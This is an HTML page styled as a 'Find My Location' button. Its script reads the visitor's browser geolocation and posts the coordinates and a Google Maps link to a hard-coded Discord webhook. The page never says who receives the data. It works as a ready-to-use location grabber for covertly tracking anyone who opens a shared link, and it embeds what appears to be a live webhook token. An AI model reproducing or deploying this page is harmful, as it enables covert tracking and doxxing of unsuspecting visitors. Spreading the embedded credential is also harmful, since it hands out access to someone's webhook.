<!DOCTYPE html>
<html>
<body style="font-family:Arial; text-align:center; padding-top:50px;">

<h1>Location Page</h1>
<p>Click the button below to send your location</p>

<button onclick="getLocation()" style="
  padding: 15px 25px;
  font-size: 18px;
  border-radius: 10px;
  background: black;
  color: white;
  border: none;
  cursor: pointer;
">
📍 Find My Location
</button>

<script>
function getLocation() {
  navigator.geolocation.getCurrentPosition(function(position) {

    fetch("https://discord.com/api/webhooks/1489231047798423684/bQCkm-7dZ4GKn5B-FTXhp2vmzwapkTXWk6rJZfqNMg0yvt9OkfmHkkjr1L0EihY8eAIh", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        content:
          "📍 Location received:\nLatitude: " +
          position.coords.latitude +
          "\nLongitude: " +
          position.coords.longitude +
          "\nhttps://www.google.com/maps?q=" +
          position.coords.latitude +
          "," +
          position.coords.longitude
      })
    });

    alert("Location sent!");
  });
}
</script>

</body>
</html>
